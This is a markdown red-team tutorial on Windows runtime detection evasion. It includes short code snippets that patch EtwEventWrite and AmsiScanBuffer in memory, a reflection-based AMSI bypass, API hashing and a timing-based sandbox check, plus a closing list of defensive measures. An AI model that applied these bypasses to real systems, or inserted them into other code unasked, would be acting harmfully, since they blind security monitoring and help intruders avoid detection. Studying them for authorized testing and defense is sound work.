**Runtime Detection Evasion & Logging Bypass**

---

````markdown
# 🕵️ Runtime Detection Evasion & Logging Bypass

> **Disclaimer:** This guide is intended for **authorized penetration testing**, **red teaming**, and **educational** use only. Do **not** use these techniques without explicit permission.

---

## 📚 Table of Contents

1. [What is Runtime Detection?](#1-what-is-runtime-detection)
2. [Common Detection Methods](#2-common-detection-methods)
3. [Runtime Evasion Techniques](#3-runtime-evasion-techniques)
4. [Evading Logging & Monitoring](#4-evading-logging--monitoring)
5. [ETW, Sysmon, and EventLog Bypass](#5-etw-sysmon-and-eventlog-bypass)
6. [AMSI and Defender Evasion](#6-amsi-and-defender-evasion)
7. [Practical Examples](#7-practical-examples)
8. [Defensive Considerations](#8-defensive-considerations)

---

## 1. 🎯 What is Runtime Detection?

**Runtime detection** refers to identifying malicious behavior **while it is executing**, not just via static signatures. This includes memory analysis, API call tracing, behavior-based rules, and logging systems.

---

## 2. 🔍 Common Detection Methods

| Method            | Description                                      |
|------------------|--------------------------------------------------|
| API hooking       | Intercepts WinAPI to monitor actions            |
| ETW logging       | Event Tracing for Windows                       |
| Sysmon logging    | Logs process creation, file, and network events |
| AMSI scanning     | Scans PowerShell and scripts at runtime         |
| EDR sensors       | Agent-based runtime monitoring                  |

---

## 3. 🛡️ Runtime Evasion Techniques

| Technique                    | Description                                      |
|------------------------------|--------------------------------------------------|
| Manual syscall stubs         | Avoids hooked WinAPI by calling syscalls directly |
| API hashing                  | Resolves APIs at runtime to evade detection       |
| Unhooking DLLs               | Restore clean versions of ntdll.dll, etc.        |
| Sleep obfuscation            | Avoids sandbox execution via `Sleep` or loops    |
| Heap spraying                | Disrupts memory-based detection                  |
| Indirect function calls      | Breaks behavior tracing with stack obfuscation   |

---

## 4. 🧼 Evading Logging & Monitoring

### General Techniques:
- Disable or patch logging APIs (`EventWrite`, `EtwEventWrite`)
- Use unmanaged code or native APIs
- Obfuscate or encrypt logs before writing (delays detection)
- Hide in legitimate parent-child process chains

---

## 5. 🧬 ETW, Sysmon, and EventLog Bypass

### ETW (Event Tracing for Windows) Bypass:
```c
// Patch EtwEventWrite
DWORD oldProtect;
VirtualProtect(EtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(BYTE*)EtwEventWrite = 0xC3;  // RET instruction
````

### Sysmon Evasion:

* Spoof parent process with `STARTUPINFOEX`
* Use `SetThreadDescription` to confuse detection
* Inject into trusted processes (e.g., `explorer.exe`)

---

## 6. 🚫 AMSI and Defender Evasion

### Bypass AMSI (Antimalware Scan Interface):

```csharp
var amsi = typeof(AMSI).Assembly.GetType("System.Management.Automation.AmsiUtils");
var field = amsi.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
field.SetValue(null, true);
```

### In Memory Patch:

```c
// Patch AmsiScanBuffer to return 0
BYTE patch[] = { 0x31, 0xC0, 0xC3 };
memcpy(amsiScanAddress, patch, sizeof(patch));
```

---

## 7. 🧪 Practical Examples

### Example: API Hashing

```c
DWORD hash = crc32("CreateRemoteThread");
```

### Example: Sleep Obfuscation

```c
DWORD64 start = __rdtsc();
Sleep(5000);
DWORD64 end = __rdtsc();
if (end - start < expected_ticks) ExitProcess(1); // Sandbox detected
```

---

## 8. 🛡️ Defensive Considerations

### What defenders can do:

* Monitor for `VirtualProtect`, `NtProtectVirtualMemory`
* Alert on patching functions like `EtwEventWrite`, `AmsiScanBuffer`
* Enable Process Mitigations (CFG, ACG, CIG)
* Use userland and kernelland logging
* Utilize canary tokens and decoy scripts
